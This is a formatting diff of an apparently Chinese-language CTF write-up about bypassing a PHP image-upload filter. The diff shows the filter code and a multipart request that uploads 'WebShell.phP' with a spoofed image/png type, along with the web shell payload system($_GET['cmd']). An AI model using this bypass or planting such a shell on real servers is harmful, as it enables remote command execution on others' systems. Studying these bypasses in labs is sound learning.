@@ -6,7 +6,7 @@
 給了一個網址，點開來是一個簡單的上傳頁面：
 ![[W1-7_web.png|386]]
 網頁原始碼跟 [[Uploader]] 的一樣，但多了限制：
-```
+```php
 if ($_FILES['file']['type'] === "image/png"){
 	if ($extension !== "php" ){
 		move_uploaded_file($_FILES['file']['tmp_name'], $dest);
@@ -38,7 +38,7 @@ if ($_FILES['file']['type'] === "image/png"){
      > - ZIP：`50 4B 03 04`
    
    - 寫入惡意 php 程式 `system($_GET['cmd']);` 並送出
-     ```
+     ```php
      Content-Disposition: form-data; name="file"; filename="WebShell.phP"
 		Content-Type: image/png
 		
